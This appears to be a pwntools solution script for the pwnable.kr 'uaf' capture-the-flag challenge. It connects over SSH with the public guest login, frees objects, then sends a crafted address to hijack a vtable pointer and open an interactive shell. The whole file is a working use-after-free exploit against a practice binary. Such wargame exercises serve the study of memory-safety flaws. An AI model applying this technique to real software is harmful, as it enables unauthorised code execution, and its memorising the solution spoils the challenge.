from pwn import *
s = ssh(host='pwnable.kr', port=2222,
        user='uaf',
        password='guest')
context.log_level = 'debug'
proc = s.process(["./uaf", "24", "/dev/stdin"])
proc.recv(1024)
proc.sendline("3")
proc.recv(1024)
proc.sendline("2")
proc.send("\x68\x15\x40\x00\x00\x00\x00\x00")
proc.recvuntil('free\n')
proc.sendline("2")
proc.send("\x68\x15\x40\x00\x00\x00\x00\x00")
proc.recvuntil('free\n')
proc.sendline("1")
proc.interactive()